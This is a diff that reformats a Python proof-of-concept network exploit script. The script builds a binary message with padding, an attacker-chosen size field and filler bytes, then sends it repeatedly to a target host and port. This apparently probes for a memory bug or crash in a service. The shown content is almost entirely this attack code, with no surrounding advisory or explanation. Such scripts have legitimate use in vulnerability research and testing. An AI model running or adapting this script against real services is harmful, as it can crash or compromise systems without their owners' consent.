@@ -1,5 +1,10 @@
-import sys, socket, argparse, hexdump, time
+import argparse
+import socket
+import time
 from struct import *
+
+import hexdump
+
 
 def dump(title, data):
   if debug and data:
@@ -25,12 +30,12 @@ size = args.size
 debug = args.verbose
 
 
-data  = pack('<I', 5) 
+data  = pack('<I', 5)
 data += b'\x00' * (0x2C - len(data))
-data += pack('<I', size) + b'A' * 16 
+data += pack('<I', size) + b'A' * 16
 
 msg  = pack('<HHIII', 1, 0, 7, 0, 1) + data
-msg = pack('<H', 2 + len(msg)) + msg 
+msg = pack('<H', 2 + len(msg)) + msg
 dump('msg', msg)
 
 for i in range(1000):
@@ -38,9 +43,9 @@ for i in range(1000):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target, port))
   s.sendall(msg)
-  try: 
+  try:
     s.recv(1024)
-  except: 
+  except:
     pass
   s.close()
   time.sleep(1)
